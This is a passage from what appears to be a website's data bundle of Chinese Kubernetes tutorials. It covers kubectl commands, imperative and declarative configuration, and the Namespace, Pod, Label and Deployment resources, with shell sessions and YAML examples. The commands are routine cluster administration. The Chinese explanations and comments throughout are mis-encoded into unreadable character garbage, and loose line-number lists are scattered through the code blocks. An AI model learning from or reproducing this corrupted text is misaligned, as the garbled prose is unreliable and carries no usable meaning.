èµæº\næå¡åç°èµæº       services                   svc      ç»ä¸ pod å¯¹å¤æ¥å£\n             ingress                    ing      ç»ä¸ pod å¯¹å¤æ¥å£\nå­å¨èµæº         volumeattachments                   å­å¨\n             persistentvolumes          pv       å­å¨\n             persistentvolumeclaims     pvc      å­å¨\néç½®èµæº         configmaps                 cm       éç½®\n             secrets                             éç½®\n\n# æä½\n\nkubernetes åè®¸å¯¹èµæºè¿è¡å¤ç§æä½ï¼å¯ä»¥éè¿ --help æ¥çè¯¦ç»çæä½å½ä»¤\n\nkubectl --help\n\n\n1\n\n\nç»å¸¸ä½¿ç¨çæä½æä¸é¢è¿äºï¼\n\nå½ä»¤åç±»    å½ä»¤             ç¿»è¯                 å½ä»¤ä½ç¨\nåºæ¬å½ä»¤    create         åå»º                 åå»ºä¸ä¸ªèµæº\n        edit           ç¼è¾                 ç¼è¾ä¸ä¸ªèµæº\n        get            è·å                 è·åä¸ä¸ªèµæº\n        patch          æ´æ°                 æ´æ°ä¸ä¸ªèµæº\n        delete         å é¤                 å é¤ä¸ä¸ªèµæº\n        explain        è§£é                 å±ç¤ºèµæºææ¡£\nè¿è¡åè°è¯   run            è¿è¡                 å¨éç¾¤ä¸­è¿è¡ä¸ä¸ªæå®çéå\n        expose         æ´é²                 æ´é²èµæºä¸º service\n        describe       æè¿°                 æ¾ç¤ºèµæºåé¨ä¿¡æ¯\n        logs           æ¥å¿è¾åºå®¹å¨å¨ pod ä¸­çæ¥å¿   è¾åºå®¹å¨å¨ pod ä¸­çæ¥å¿\n        attach         ç¼ ç»è¿å¥è¿è¡ä¸­çå®¹å¨         è¿å¥è¿è¡ä¸­çå®¹å¨\n        exec           æ§è¡å®¹å¨ä¸­çä¸ä¸ªå½ä»¤         æ§è¡å®¹å¨ä¸­çä¸ä¸ªå½ä»¤\n        cp             å¤å¶                 å¨ pod åå¤å¤å¶æä»¶\n        rollout        é¦æ¬¡å±ç¤º               ç®¡çèµæºçåå¸\n        scale          è§æ¨¡                 æ© (ç¼©) å®¹ pod çæ°é\n        autoscale      èªå¨è°æ´               èªå¨è°æ´ pod çæ°é\né«çº§å½ä»¤    apply          rc                 éè¿æä»¶å¯¹èµæºè¿è¡éç½®\n        label          æ ç­¾                 æ´æ°èµæºä¸çæ ç­¾\nå¶ä»å½ä»¤    cluster-info   éç¾¤ä¿¡æ¯               æ¾ç¤ºéç¾¤ä¿¡æ¯\n        version        çæ¬                 æ¾ç¤ºå½å server å client ççæ¬\n\nä¸é¢ä»¥ä¸ä¸ª namespace /pod çåå»ºåå é¤ç®åæ¼ç¤ºä¸å½ä»¤çä½¿ç¨ï¼\n\n# åå»ºä¸ä¸ªnamespace\n[root@master ~]# kubectl create namespace dev\nnamespace/dev created\n\n# è·ånamespace\n[root@master ~]# kubectl get ns\nname              status   age\ndefault           active   21h\ndev               active   21s\nkube-node-lease   active   21h\nkube-public       active   21h\nkube-system       active   21h\n\n# å¨æ­¤namespaceä¸åå»ºå¹¶è¿è¡ä¸ä¸ªnginxçpod\n[root@master ~]# kubectl run pod --image=nginx:latest -n dev\nkubectl run --generator=deployment/apps.v1 is deprecated and will be removed in a future version. use kubectl run --generator=run-pod/v1 or kubectl create instead.\ndeployment.apps/pod created\n\n# æ¥çæ°åå»ºçpod\n[root@master ~]# kubectl get pod -n dev\nname  ready   status    restarts   age\npod   1/1     running   0          21s\n\n# å é¤æå®çpod\n[root@master ~]# kubectl delete pod pod-864f9875b9-pcw7x\npod "pod" deleted\n\n# å é¤æå®çnamespace\n[root@master ~]# kubectl delete ns dev\nnamespace "dev" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n\n# å½ä»¤å¼å¯¹è±¡éç½®\n\nå½ä»¤å¼å¯¹è±¡éç½®å°±æ¯ä½¿ç¨å½ä»¤éåéç½®æä»¶ä¸èµ·æ¥æä½ kubernetes èµæºã\n1ï¼ åå»ºä¸ä¸ª nginxpod.yamlï¼åå®¹å¦ä¸ï¼\n\n# çæ¬\napiversion: v1\n# ç±»å\nkind: namespace\n# åæ°æ®\nmetadata:\n  # åç§°\n  name: dev\n\n---\n\napiversion: v1\nkind: pod\nmetadata:\n  # åç§°\n  name: nginxpod\n  # æå¨å½åç©ºé´\n  namespace: dev\n# è¯¦ç»æè¿°\nspec:\n  containers:\n  # å®¹å¨çåå­\n  - name: nginx-containers\n    # å®¹å¨æç¨çéå\n    image: nginx:latest\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n2ï¼æ§è¡ create å½ä»¤ï¼åå»ºèµæºï¼\n\n[root@master ~]# kubectl create -f nginxpod.yaml\nnamespace/dev created\npod/nginxpod created\n\n\n1\n2\n3\n\n\næ­¤æ¶åç°åå»ºäºä¸¤ä¸ªèµæºå¯¹è±¡ï¼åå«æ¯ namespace å pod\n\n3ï¼æ§è¡ get å½ä»¤ï¼æ¥çèµæºï¼\n\n[root@master ~]#  kubectl get -f nginxpod.yaml\nname            status   age\nnamespace/dev   active   18s\n\nname            ready   status    restarts   age\npod/nginxpod    1/1     running   0          17s\n\n\n1\n2\n3\n4\n5\n6\n\n\nè¿æ ·å°±æ¾ç¤ºäºä¸¤ä¸ªèµæºå¯¹è±¡çä¿¡æ¯\n\n4ï¼æ§è¡ delete å½ä»¤ï¼å é¤èµæºï¼\n\n[root@master ~]# kubectl delete -f nginxpod.yaml\nnamespace "dev" deleted\npod "nginxpod" deleted\n\n\n1\n2\n3\n\n\næ­¤æ¶åç°ä¸¤ä¸ªèµæºå¯¹è±¡è¢«å é¤äº\n\næ»ç»:\n    å½ä»¤å¼å¯¹è±¡éç½®çæ¹å¼æä½èµæºï¼å¯ä»¥ç®åçè®¤ä¸ºï¼å½ä»¤  +  yamléç½®æä»¶ï¼éé¢æ¯å½ä»¤éè¦çåç§åæ°ï¼\n\n\n1\n2\n\n\n\n# å£°æå¼å¯¹è±¡éç½®\n\nå£°æå¼å¯¹è±¡éç½®è·å½ä»¤å¼å¯¹è±¡éç½®å¾ç¸ä¼¼ï¼ä½æ¯å®åªæä¸ä¸ªå½ä»¤ applyã\n\n# é¦åæ§è¡ä¸æ¬¡kubectl apply -f yamlæä»¶ï¼åç°åå»ºäºèµæº\n[root@master ~]#  kubectl apply -f nginxpod.yaml\nnamespace/dev created\npod/nginxpod created\n\n# åæ¬¡æ§è¡ä¸æ¬¡kubectl apply -f yamlæä»¶ï¼åç°è¯´èµæºæ²¡æåå¨\n[root@master ~]#  kubectl apply -f nginxpod.yaml\nnamespace/dev unchanged\npod/nginxpod unchanged\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\næ»ç»:\n    å¶å®å£°æå¼å¯¹è±¡éç½®å°±æ¯ä½¿ç¨applyæè¿°ä¸ä¸ªèµæºæç»çç¶æï¼å¨yamlä¸­å®ä¹ç¶æï¼\n    ä½¿ç¨applyæä½èµæºï¼\n        å¦æèµæºä¸å­å¨ï¼å°±åå»ºï¼ç¸å½äº kubectl create\n        å¦æèµæºå·²å­å¨ï¼å°±æ´æ°ï¼ç¸å½äº kubectl patch\n\n\n1\n2\n3\n4\n5\n\n\n> æ©å±ï¼kubectl å¯ä»¥å¨ node èç¹ä¸è¿è¡åï¼\n\nkubectl çè¿è¡æ¯éè¦è¿è¡éç½®çï¼å®çéç½®æä»¶æ¯ $home/.kubeï¼å¦ææ³è¦å¨ node èç¹è¿è¡æ­¤å½ä»¤ï¼éè¦å° master ä¸ç.kube æä»¶å¤å¶å° node èç¹ä¸ï¼å³å¨ master èç¹ä¸æ§è¡ä¸é¢æä½ï¼\n\nscp  -r  ~/.kube   node102:~/\n\n\n1\n\n\n> ä½¿ç¨æ¨èï¼ä¸ç§æ¹å¼åºè¯¥æä¹ç¨ï¼\n> åå»º / æ´æ°èµæº ä½¿ç¨å£°æå¼å¯¹è±¡éç½® kubectl apply -f xxx.yaml\n> å é¤èµæº ä½¿ç¨å½ä»¤å¼å¯¹è±¡éç½® kubectl delete -f xxx.yaml\n> æ¥è¯¢èµæº ä½¿ç¨å½ä»¤å¼å¯¹è±¡ç®¡ç kubectl get (describe) èµæºåç§°',charsets:{cjk:!0}},{title:"kubernetes(å) NamespaceãPodãLableãDeploymentãService çèµæºä»ç»",frontmatter:{title:"kubernetes(å) NamespaceãPodãLableãDeploymentãService çèµæºä»ç»",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/603",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/60.Kubernetes/603.kubernetes(%E5%9B%9B)%20Namespace%E3%80%81Pod%E3%80%81Lable%E3%80%81Deployment%E3%80%81Service%20%E7%9A%84%E8%B5%84%E6%BA%90%E4%BB%8B%E7%BB%8D.html",relativePath:"01.è¿ç»´/60.Kubernetes/603.kubernetes(å) NamespaceãPodãLableãDeploymentãService çèµæºä»ç».md",key:"v-62470732",path:"/kubernetes/603/",headers:[{level:2,title:"Namespace",slug:"namespace",normalizedTitle:"namespace",charIndex:2},{level:2,title:"Pod",slug:"pod",normalizedTitle:"pod",charIndex:107},{level:2,title:"Label",slug:"label",normalizedTitle:"label",charIndex:1735},{level:2,title:"Deployment",slug:"deployment",normalizedTitle:"deployment",charIndex:10052},{level:2,title:"Service",slug:"service",normalizedTitle:"service",charIndex:7882}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"Namespace Pod Label Deployment Service",content:'# Namespace\n\nNamespace æ¯ kubernetes ç³»ç»ä¸­çä¸ç§éå¸¸éè¦èµæºï¼å®çä¸»è¦ä½ç¨æ¯ç¨æ¥å®ç°å¤å¥ç¯å¢çèµæºéç¦»æèå¤ç§æ·çèµæºéç¦»ã\n\né»è®¤æåµä¸ï¼kubernetes éç¾¤ä¸­çææç Pod é½æ¯å¯ä»¥ç¸äºè®¿é®çãä½æ¯å¨å®éä¸­ï¼å¯è½ä¸æ³è®©ä¸¤ä¸ª Pod ä¹é´è¿è¡äºç¸çè®¿é®ï¼é£æ­¤æ¶å°±å¯ä»¥å°ä¸¤ä¸ª Pod ååå°ä¸åç namespace ä¸ãkubernetes éè¿å°éç¾¤åé¨çèµæºåéå°ä¸åç Namespace ä¸­ï¼å¯ä»¥å½¢æé»è¾ä¸ç "ç»"ï¼ä»¥æ¹ä¾¿ä¸åçç»çèµæºè¿è¡éç¦»ä½¿ç¨åç®¡çã\n\nå¯ä»¥éè¿ kubernetes çæææºå¶ï¼å°ä¸åç namespace äº¤ç»ä¸åç§æ·è¿è¡ç®¡çï¼è¿æ ·å°±å®ç°äºå¤ç§æ·çèµæºéç¦»ãæ­¤æ¶è¿è½ç»å kubernetes çèµæºéé¢æºå¶ï¼éå®ä¸åç§æ·è½å ç¨çèµæºï¼ä¾å¦ CPU ä½¿ç¨éãåå­ä½¿ç¨éç­ç­ï¼æ¥å®ç°ç§æ·å¯ç¨èµæºçç®¡çã\n\n\n\nkubernetes å¨éç¾¤å¯å¨ä¹åï¼ä¼é»è®¤åå»ºå ä¸ª namespace\n\n[root@master ~]# kubectl  get namespace\nNAME              STATUS   AGE\ndefault           Active   45h     \nkube-node-lease   Active   45h  \nkube-public       Active   45h     \nkube-system       Active   45h    \n\n\n1\n2\n3\n4\n5\n6\n\n * default æææªæå® Namespace çå¯¹è±¡é½ä¼è¢«åéå¨ default å½åç©ºé´\n * kube-node-lease éç¾¤èç¹ä¹é´çå¿è·³ç»´æ¤ï¼v1.13 å¼å§å¼å¥\n * kube-public æ­¤å½åç©ºé´ä¸çèµæºå¯ä»¥è¢«ææäººè®¿é®ï¼åæ¬æªè®¤è¯ç¨æ·ï¼\n * kube-system ææç± Kubernetes ç³»ç»åå»ºçèµæºé½å¤äºè¿ä¸ªå½åç©ºé´\n\nä¸é¢æ¥ç namespace èµæºçå·ä½æä½ï¼\næ¥ç\n\n# 1 æ¥çææçns  å½ä»¤ï¼kubectl get ns\n[root@master ~]# kubectl get ns\nNAME              STATUS   AGE\ndefault           Active   45h\nkube-node-lease   Active   45h\nkube-public       Active   45h     \nkube-system       Active   45h     \n\n# 2 æ¥çæå®çns   å½ä»¤ï¼kubectl get ns nsåç§°\n[root@master ~]# kubectl get ns default\nNAME      STATUS   AGE\ndefault   Active   45h\n\n# 3 æå®è¾åºæ ¼å¼  å½ä»¤ï¼kubectl get ns nsåç§°  -o æ ¼å¼åæ°\n# kubernetesæ¯æçæ ¼å¼æå¾å¤ï¼æ¯è¾å¸¸è§çæ¯wideãjsonãyaml\n[root@master ~]# kubectl get ns default -o yaml\napiVersion: v1\nkind: Namespace\nmetadata:\n  creationTimestamp: "2021-05-08T04:44:16Z"\n  name: default\n  resourceVersion: "151"\n  selfLink: /api/v1/namespaces/default\n  uid: 7405f73a-e486-43d4-9db6-145f1409f090\nspec:\n  finalizers:\n  - kubernetes\nstatus:\n  phase: Active\n  \n# 4 æ¥çnsè¯¦æ  å½ä»¤ï¼kubectl describe ns nsåç§°\n[root@master ~]# kubectl describe ns default\nName:         default\nLabels:       <none>\nAnnotations:  <none>\nStatus:       Active  # Active å½åç©ºé´æ­£å¨ä½¿ç¨ä¸­  Terminating æ­£å¨å é¤å½åç©ºé´\n\n# ResourceQuota éå¯¹namespaceåçèµæºéå¶\n# LimitRangeéå¯¹namespaceä¸­çæ¯ä¸ªç»ä»¶åçèµæºéå¶\nNo resource quota.\nNo LimitRange resource.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\nåå»º\n\n# åå»ºnamespace\n[root@master ~]# kubectl create ns dev\nnamespace/dev created\n\n\n1\n2\n3\n\n\nå é¤\n\n# å é¤namespace\n[root@master ~]# kubectl delete ns dev\nnamespace "dev" deleted\n\n\n1\n2\n3\n\n\néç½®æ¹å¼\n\napiVersion: v1\nkind: Namespace\nmetadata:\n  name: dev\n\n\n1\n2\n3\n4\n\n\nç¶åå°±å¯ä»¥æ§è¡å¯¹åºçåå»ºåå é¤å½ä»¤äºï¼\nåå»ºï¼kubectl create -f ns-dev.yaml\nå é¤ï¼kubectl delete -f ns-dev.yaml\n\n\n# Pod\n\nPod æ¯ kubernetes éç¾¤è¿è¡ç®¡ççæå°ååï¼ç¨åºè¦è¿è¡å¿é¡»é¨ç½²å¨å®¹å¨ä¸­ï¼èå®¹å¨å¿é¡»å­å¨äº Pod ä¸­ãPod å¯ä»¥è®¤ä¸ºæ¯å®¹å¨çå°è£ï¼ä¸ä¸ª Pod ä¸­å¯ä»¥å­å¨ä¸ä¸ªæèå¤ä¸ªå®¹å¨ã\n\n\n\nkubernetes å¨éç¾¤å¯å¨ä¹åï¼éç¾¤ä¸­çåä¸ªç»ä»¶ä¹é½æ¯ä»¥ Pod æ¹å¼è¿è¡çãå¯ä»¥éè¿ä¸é¢å½ä»¤æ¥çï¼\n\n[root@master ~]# kubectl get pod -n kube-system\nNAMESPACE     NAME                             READY   STATUS    RESTARTS   AGE\nkube-system   coredns-6955765f44-68g6v         1/1     Running   0          2d1h\nkube-system   coredns-6955765f44-cs5r8         1/1     Running   0          2d1h\nkube-system   etcd-master                      1/1     Running   0          2d1h\nkube-system   kube-apiserver-master            1/1     Running   0          2d1h\nkube-system   kube-controller-manager-master   1/1     Running   0          2d1h\nkube-system   kube-flannel-ds-amd64-47r25      1/1     Running   0          2d1h\nkube-system   kube-flannel-ds-amd64-ls5lh      1/1     Running   0          2d1h\nkube-system   kube-proxy-685tk                 1/1     Running   0          2d1h\nkube-system   kube-proxy-87spt                 1/1     Running   0          2d1h\nkube-system   kube-scheduler-master            1/1     Running   0          2d1h\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nåå»ºå¹¶è¿è¡\nkubernetes æ²¡ææä¾åç¬è¿è¡ Pod çå½ä»¤ï¼é½æ¯éè¿ Pod æ§å¶å¨æ¥å®ç°ç\n\n# å½ä»¤æ ¼å¼ï¼ kubectl run (podæ§å¶å¨åç§°) [åæ°] \n# --image  æå®Podçéå\n# --port   æå®ç«¯å£\n# --namespace  æå®namespace\n[root@master ~]# kubectl run nginx --image=nginx:latest --port=80 --namespace dev \ndeployment.apps/nginx created\n\n\n1\n2\n3\n4\n5\n6\n\n\næ¥ç pod ä¿¡æ¯\n\n# æ¥çPodåºæ¬ä¿¡æ¯\n[root@master ~]# kubectl get pods -n dev\nNAME    READY   STATUS    RESTARTS   AGE\nnginx   1/1     Running   0          43s\n\n# æ¥çPodçè¯¦ç»ä¿¡æ¯\n[root@master ~]# kubectl describe pod nginx -n dev\nName:         nginx\nNamespace:    dev\nPriority:     0\nNode:         node1/192.168.5.4\nStart Time:   Wed, 08 May 2021 09:29:24 +0800\nLabels:       pod-template-hash=5ff7956ff6\n              run=nginx\nAnnotations:  <none>\nStatus:       Running\nIP:           10.244.1.23\nIPs:\n  IP:           10.244.1.23\nControlled By:  ReplicaSet/nginx\nContainers:\n  nginx:\n    Container ID:   docker://4c62b8c0648d2512380f4ffa5da2c99d16e05634979973449c98e9b829f6253c\n    Image:          nginx:latest\n    Image ID:       docker-pullable://nginx@sha256:485b610fefec7ff6c463ced9623314a04ed67e3945b9c08d7e53a47f6d108dc7\n    Port:           80/TCP\n    Host Port:      0/TCP\n    State:          Running\n      Started:      Wed, 08 May 2021 09:30:01 +0800\n    Ready:          True\n    Restart Count:  0\n    Environment:    <none>\n    Mounts:\n      /var/run/secrets/kubernetes.io/serviceaccount from default-token-hwvvw (ro)\nConditions:\n  Type              Status\n  Initialized       True\n  Ready             True\n  ContainersReady   True\n  PodScheduled      True\nVolumes:\n  default-token-hwvvw:\n    Type:        Secret (a volume populated by a Secret)\n    SecretName:  default-token-hwvvw\n    Optional:    false\nQoS Class:       BestEffort\nNode-Selectors:  <none>\nTolerations:     node.kubernetes.io/not-ready:NoExecute for 300s\n                 node.kubernetes.io/unreachable:NoExecute for 300s\nEvents:\n  Type    Reason     Age        From               Message\n  ----    ------     ----       ----               -------\n  Normal  Scheduled  <unknown>  default-scheduler  Successfully assigned dev/nginx-5ff7956ff6-fg2db to node1\n  Normal  Pulling    4m11s      kubelet, node1     Pulling image "nginx:latest"\n  Normal  Pulled     3m36s      kubelet, node1     Successfully pulled image "nginx:latest"\n  Normal  Created    3m36s      kubelet, node1     Created container nginx\n  Normal  Started    3m36s      kubelet, node1     Started container nginx\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n\n\nè®¿é® Pod\n\n# è·åpodIP\n[root@master ~]# kubectl get pods -n dev -o wide\nNAME    READY   STATUS    RESTARTS   AGE    IP             NODE    ... \nnginx   1/1     Running   0          190s   10.244.1.23   node1   ...\n\n#è®¿é®POD\n[root@master ~]# curl http://10.244.1.23:80\n<!DOCTYPE html>\n<html>\n<head>\n\t<title>Welcome to nginx!</title>\n</head>\n<body>\n\t<p><em>Thank you for using nginx.</em></p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nå é¤æå® Pod\n\n# å é¤æå®Pod\n[root@master ~]# kubectl delete pod nginx -n dev\npod "nginx" deleted\n\n# æ­¤æ¶ï¼æ¾ç¤ºå é¤Podæåï¼ä½æ¯åæ¥è¯¢ï¼åç°åæ°äº§çäºä¸ä¸ª \n[root@master ~]# kubectl get pods -n dev\nNAME    READY   STATUS    RESTARTS   AGE\nnginx   1/1     Running   0          21s\n\n# è¿æ¯å ä¸ºå½åPodæ¯ç±Podæ§å¶å¨åå»ºçï¼æ§å¶å¨ä¼çæ§Podç¶åµï¼ä¸æ¦åç°Podæ­»äº¡ï¼ä¼ç«å³éå»º\n# æ­¤æ¶è¦æ³å é¤Podï¼å¿é¡»å é¤Podæ§å¶å¨\n\n# åæ¥æ¥è¯¢ä¸ä¸å½ånamespaceä¸çPodæ§å¶å¨\n[root@master ~]# kubectl get deploy -n  dev\nNAME    READY   UP-TO-DATE   AVAILABLE   AGE\nnginx   1/1     1            1           9m7s\n\n# æ¥ä¸æ¥ï¼å é¤æ­¤PodPodæ§å¶å¨\n[root@master ~]# kubectl delete deploy nginx -n dev\ndeployment.apps "nginx" deleted\n\n# ç¨ç­çå»ï¼åæ¥è¯¢Podï¼åç°Podè¢«å é¤äº\n[root@master ~]# kubectl get pods -n dev\nNo resources found in dev namespace.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\néç½®æä½\nåå»ºä¸ä¸ª pod-nginx.yamlï¼åå®¹å¦ä¸ï¼\nè¿ç§åå»ºæ¹å¼ä¸ä¼å kubectl run å¨åå»º Pod æ¶ä¼åå»º Pod æ§å¶å¨ï¼ä»¥ä¸æ¯ä¸ä¼åå»º Pod æ§å¶å¨çã\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\n  namespace: dev\nspec:\n  containers:\n  - image: nginx:latest\n    name: pod\n    ports:\n    - name: nginx-port\n      containerPort: 80\n      protocol: TCP\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nç¶åå°±å¯ä»¥æ§è¡å¯¹åºçåå»ºåå é¤å½ä»¤äºï¼\nåå»ºï¼kubectl create -f pod-nginx.yaml\nå é¤ï¼kubectl delete -f pod-nginx.yaml\n\n\n# Label\n\nLabel æ¯ kubernetes ç³»ç»ä¸­çä¸ä¸ªéè¦æ¦å¿µãå®çä½ç¨å°±æ¯å¨èµæºä¸æ·»å æ è¯ï¼ç¨æ¥å¯¹å®ä»¬è¿è¡åºååéæ©ã\n\nLabel çç¹ç¹ï¼\n\n * ä¸ä¸ª Label ä¼ä»¥ key/value é®å¼å¯¹çå½¢å¼éå å°åç§å¯¹è±¡ä¸ï¼å¦ NodeãPodãService ç­ç­\n * ä¸ä¸ªèµæºå¯¹è±¡å¯ä»¥å®ä¹ä»»ææ°éç Label ï¼åä¸ä¸ª Label ä¹å¯ä»¥è¢«æ·»å å°ä»»ææ°éçèµæºå¯¹è±¡ä¸å»\n * Label éå¸¸å¨èµæºå¯¹è±¡å®ä¹æ¶ç¡®å®ï¼å½ç¶ä¹å¯ä»¥å¨å¯¹è±¡åå»ºåå¨ææ·»å æèå é¤\n\nå¯ä»¥éè¿ Label å®ç°èµæºçå¤ç»´åº¦åç»ï¼ä»¥ä¾¿çµæ´»ãæ¹ä¾¿å°è¿è¡èµæºåéãè°åº¦ãéç½®ãé¨ç½²ç­ç®¡çå·¥ä½ã\n\n> ä¸äºå¸¸ç¨ç Label ç¤ºä¾å¦ä¸ï¼\n> çæ¬æ ç­¾ï¼"version":"release", "version":"stable"......\n> ç¯å¢æ ç­¾ï¼"environment":"dev"ï¼"environment":"test"ï¼"environment":"pro"\n> æ¶ææ ç­¾ï¼"tier":"frontend"ï¼"tier":"backend"\n\næ ç­¾å®ä¹å®æ¯ä¹åï¼è¿è¦èèå°æ ç­¾çéæ©ï¼è¿å°±è¦ä½¿ç¨å° Label Selectorï¼å³ï¼\nLabel ç¨äºç»æä¸ªèµæºå¯¹è±¡å®ä¹æ è¯\nLabel Selector ç¨äºæ¥è¯¢åç­éæ¥ææäºæ ç­¾çèµæºå¯¹è±¡\n\nå½åæä¸¤ç§ Label Selectorï¼\n\n * åºäºç­å¼ç Label Selector\n   name = slave: éæ©ææåå« Label ä¸­ key="name" ä¸ value="slave" çå¯¹è±¡\n   env != production: éæ©ææåæ¬ Label ä¸­ç key="env" ä¸ value ä¸ç­äº "production" çå¯¹è±¡\n * åºäºéåç Label Selector\n   name in (master, slave): éæ©ææåå« Label ä¸­ç key="name" ä¸ value="master" æ "slave" çå¯¹è±¡\n   name not in (frontend): éæ©ææåå« Label ä¸­ç key="name" ä¸ value ä¸ç­äº "frontend" çå¯¹è±¡\n\næ ç­¾çéæ©æ¡ä»¶å¯ä»¥ä½¿ç¨å¤ä¸ªï¼æ­¤æ¶å°å¤ä¸ª Label Selector è¿è¡ç»åï¼ä½¿ç¨éå· "," è¿è¡åéå³å¯ãä¾å¦ï¼\nname=slaveï¼env!=production\nname not in (frontend)ï¼env!=production\n\nå½ä»¤æ¹å¼\n\n# ä¸ºpodèµæºææ ç­¾\n[root@master ~]# kubectl label pod nginx-pod version=1.0 -n dev\npod/nginx-pod labeled\n\n# ä¸ºpodèµæºæ´æ°æ ç­¾\n[root@master ~]# kubectl label pod nginx-pod version=2.0 -n dev --overwrite\npod/nginx-pod labeled\n\n# æ¥çæ ç­¾\n[root@master ~]# kubectl get pod nginx-pod  -n dev --show-labels\nNAME        READY   STATUS    RESTARTS   AGE   LABELS\nnginx-pod   1/1     Running   0          10m   version=2.0\n\n# ç­éæ ç­¾\n[root@master ~]# kubectl get pod -n dev -l version=2.0  --show-labels\nNAME        READY   STATUS    RESTARTS   AGE   LABELS\nnginx-pod   1/1     Running   0          17m   version=2.0\n[root@master ~]# kubectl get pod -n dev -l version!=2.0 --show-labels\nNo resources found in dev namespace.\n\n#å é¤æ ç­¾\n[root@master ~]# kubectl label pod nginx-pod version- -n dev\npod/nginx-pod labeled\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\néç½®æ¹å¼\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\n  namespace: dev\n  # åå»ºæ¶æ·»å æ ç­¾\n  labels:\n    version: "3.0" \n    env: "test"\nspec:\n  containers:\n  - image: nginx:latest\n    name: pod\n    ports:\n    - name: nginx-port\n      containerPort: 80\n      protocol: TCP\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\nç¶åå°±å¯ä»¥æ§è¡å¯¹åºçæ´æ°å½ä»¤äºï¼kubectl apply -f pod-nginx.yaml\n\n\n# Deployment\n\nå¨ kubernetes ä¸­ï¼Pod æ¯æå°çæ§å¶ååï¼ä½æ¯ kubernetes å¾å°ç´æ¥æ§å¶ Podï¼ä¸è¬é½æ¯éè¿ Pod æ§å¶å¨æ¥å®æçãPod æ§å¶å¨ç¨äº pod çç®¡çï¼ç¡®ä¿ pod èµæºç¬¦åé¢æçç¶æï¼å½ pod çèµæºåºç°æéæ¶ï¼ä¼å°è¯è¿è¡éå¯æéå»º podã\n\nå¨ kubernetes ä¸­ Pod æ§å¶å¨çç§ç±»æå¾å¤ï¼æ¬ç« èåªä»ç»ä¸ç§ï¼Deploymentã\n\n\n\nå½ä»¤æä½\n\n# å½ä»¤æ ¼å¼: kubectl run Deploymentåç§°  [åæ°] \n# --image  æå®podçéå\n# --port   æå®ç«¯å£\n# --replicas  æå®åå»ºpodæ°é\n# --namespace  æå®namespace\n[root@master ~]# kubectl run nginx --image=nginx:latest --port=80 --replicas=3 -n dev\ndeployment.apps/nginx created\n\n# æ¥çåå»ºçPod\n[root@master ~]# kubectl get pods -n dev\nNAME                     READY   STATUS    RESTARTS   AGE\nnginx-5ff7956ff6-6k8cb   1/1     Running   0          19s\nnginx-5ff7956ff6-jxfjt   1/1     Running   0          19s\nnginx-5ff7956ff6-v6jqw   1/1     Running   0          19s\n\n# æ¥çdeploymentçä¿¡æ¯\n[root@master ~]# kubectl get deploy -n dev\nNAME    READY   UP-TO-DATE   AVAILABLE   AGE\nnginx   3/3     3            3           2m42s\n\n# UP-TO-DATEï¼æååçº§çå¯æ¬æ°é\n# AVAILABLEï¼å¯ç¨å¯æ¬çæ°é\n[root@master ~]# kubectl get deploy -n dev -o wide\nNAME    READY UP-TO-DATE  AVAILABLE   AGE     CONTAINERS   IMAGES              SELECTOR\nnginx   3/3     3         3           2m51s   nginx        nginx:latest        run=nginx\n\n# æ¥çdeploymentçè¯¦ç»ä¿¡æ¯\n[root@master ~]# kubectl describe deploy nginx -n dev\nName:                   nginx\nNamespace:              dev\nCreationTimestamp:      Wed, 08 May 2021 11:14:14 +0800\nLabels:                 run=nginx\nAnnotations:            deployment.kubernetes.io/revision: 1\nSelector:               run=nginx\nReplicas:               3 desired | 3 updated | 3 total | 3 available | 0 unavailable\nStrategyType:           RollingUpdate\nMinReadySeconds:        0\nRollingUpdateStrategy:  25% max unavailable, 25% max surge\nPod Template:\n  Labels:  run=nginx\n  Containers:\n   nginx:\n    Image:        nginx:latest\n    Port:         80/TCP\n    Host Port:    0/TCP\n    Environment:  <none>\n    Mounts:       <none>\n  Volumes:        <none>\nConditions:\n  Type           Status  Reason\n  ----           ------  ------\n  Available      True    MinimumReplicasAvailable\n  Progressing    True    NewReplicaSetAvailable\nOldReplicaSets:  <none>\nNewReplicaSet:   nginx-5ff7956ff6 (3/3 replicas created)\nEvents:\n  Type    Reason             Age    From                   Message\n  ----    ------             ----   ----                   -------\n  Normal  ScalingReplicaSet  5m43s  deployment-controller  Scaled up replicaset nginx-5ff7956ff6 to 3\n  \n# å é¤,å¯¹åºçpodä¹ä¼å é¤\n[root@master ~]# kubectl delete deploy nginx -n dev\ndeployment.apps "nginx" 